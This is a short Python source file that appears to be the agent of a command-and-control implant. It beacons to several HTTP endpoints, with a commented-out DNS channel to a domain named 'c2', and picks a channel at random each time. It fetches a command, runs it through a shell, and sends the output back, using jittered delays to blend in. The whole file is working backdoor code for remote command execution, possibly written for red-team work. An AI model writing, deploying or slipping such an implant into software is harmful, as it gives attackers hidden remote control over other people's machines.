import random
import subprocess
import os


# os.environ['GRAYMAN_DEBUG'] = "1"
# os.environ['GRAYMAN_VERBOSE'] = "1"

from helpers import delay, verbose, debug
from classes import HTTPTransport, DNSTransport


DWELL_TIME = 3
URL = "https://shyft.us"
PROXIES = tuple()


def operate():
    print("Operating...")
    global DWELL_TIME

    t1 = HTTPTransport(server="http://localhost:5000/ep1", proxies=PROXIES)
    t2 = HTTPTransport(server="http://localhost:5000/ep2", proxies=PROXIES)
    t3 = HTTPTransport(server="http://localhost:5000/ep3", proxies=PROXIES)
    # t4 = DNSTransport(domain="c2.shyft.us")
    transports = [t1, t2, t3]
    while True:
        # print show running config
        verbose(f"{DWELL_TIME=} {PROXIES=}")

        # Get command
        try:
            transport = random.choice(transports)
            resp = transport.recv()
            # print(resp)
            cmd = resp.get("cmd")
            DWELL_TIME = int(resp.get("dwell_time", DWELL_TIME))
            ret = subprocess.run(cmd, capture_output=True, shell=True).stdout.decode()

        except BaseException as e:
            debug(e)

        # wait some time
        jitter = DWELL_TIME // 4
        delay(DWELL_TIME, jitter_amount=jitter)

        # send results back
        try:
            transport = random.choice(transports)
            resp = transport.send(ret)

        except BaseException as e:
            debug(e)

        # wait some more time
        jitter = DWELL_TIME // 4
        delay(DWELL_TIME, jitter_amount=jitter)


if __name__ == "__main__":
    try:
        operate()
    except KeyboardInterrupt as e:
        print("\nShutting down...", e)
